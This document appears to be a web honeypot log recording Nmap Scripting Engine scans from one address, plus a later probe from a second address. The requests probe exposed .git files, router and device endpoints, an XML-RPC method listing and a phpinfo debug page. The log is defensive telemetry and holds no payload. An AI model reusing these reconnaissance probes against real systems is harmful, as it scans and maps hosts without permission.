+2025-06-30 10:46:17 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:46:17 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /.git/HEAD
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:snare.server:handle_request: POST data:
+2025-06-30 10:47:29 INFO:snare.server:handle_request: 	- <methodCall> <methodName>system.listMethods</methodName> <params></params> </methodCall>: 
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /sdk
+2025-06-30 10:47:29 INFO:snare.server:handle_request: POST data:
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /robots.txt
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /nmaplowercheck1751280449
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "PROPFIND / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "GET /robots.txt HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "POST /sdk HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "GET /nmaplowercheck1751280449 HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "GET /.git/HEAD HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "PROPFIND / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "PROPFIND / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /HNAP1
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "GET /HNAP1 HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /evox/about
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "UNKNOWN / HTTP/1.0" 400 217 "-" "-"
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "GET /evox/about HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "HEAD / HTTP/1.1" 200 266 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "GET /favicon.ico HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:29 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:30 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:30 INFO:snare.server:handle_request: POST data:
+2025-06-30 10:47:30 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:30 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:30 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:30 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:30 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:30 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:30 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:30 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:30 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:30 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:30 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:30 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:30 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:30 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:30 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:30 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:30 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:30 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:30 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:30 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:47:36 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:36 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:36 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-30 10:47:36 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:47:36 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:47:36 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:41 INFO:snare.server:handle_request: POST data:
+2025-06-30 10:48:41 INFO:snare.server:handle_request: 	- <methodCall> <methodName>system.listMethods</methodName> <params></params> </methodCall>: 
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /nmaplowercheck1751280521
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /sdk
+2025-06-30 10:48:41 INFO:snare.server:handle_request: POST data:
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /.git/HEAD
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "POST /sdk HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "GET /nmaplowercheck1751280521 HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "GET /.git/HEAD HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "PROPFIND / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /evox/about
+2025-06-30 10:48:41 INFO:snare.server:handle_request: Request path: /robots.txt
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "GET /evox/about HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:41 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:41 +0000] "GET /robots.txt HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /HNAP1
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "UNKNOWN / HTTP/1.0" 400 217 "-" "-"
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "GET /HNAP1 HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "PROPFIND / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "PROPFIND / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "GET /favicon.ico HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "HEAD / HTTP/1.1" 200 266 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:snare.server:handle_request: POST data:
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:42 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:42 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:43 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:43 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:43 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:43 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:43 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:43 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:43 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:43 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:43 +0000] "OPTIONS / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+2025-06-30 10:48:49 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:49 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:49 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-30 10:48:49 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:48:49 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:48:49 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-30 10:56:52 INFO:snare.server:handle_request: Request path: /_profiler/phpinfo
+2025-06-30 10:56:52 INFO:aiohttp.access:log: 198.55.98.76 [30/Jun/2025:10:56:52 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 452 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
